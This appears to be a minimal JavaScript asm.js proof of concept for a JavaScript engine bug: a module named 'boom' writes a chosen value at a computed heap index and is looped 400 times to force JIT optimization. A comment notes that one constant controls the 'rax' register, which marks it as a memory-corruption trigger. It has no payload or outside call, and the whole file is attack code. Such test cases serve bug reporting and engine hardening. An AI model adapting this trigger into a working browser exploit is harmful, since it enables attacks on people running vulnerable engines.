boom=(function(stdlib,foreign,heap){
    "use asm";
    var Uint8ArrayView=new stdlib.Uint8Array(heap);
    var Int32ArrayView=new stdlib.Int32Array(heap);
    function f(i,i1){
        i1=Uint8ArrayView[256];
        // This following value '10' determines the value of 'rax'
        Int32ArrayView[i1>>10] = 0xabcdefaa;
        return(-i1+((Int32ArrayView[((i1))>>2])))}
return f
})(this,0, new ArrayBuffer(256));

for (var i = 0; i < 400; ++i) { // Trigger optimization
    boom(0, 0x1000);
}
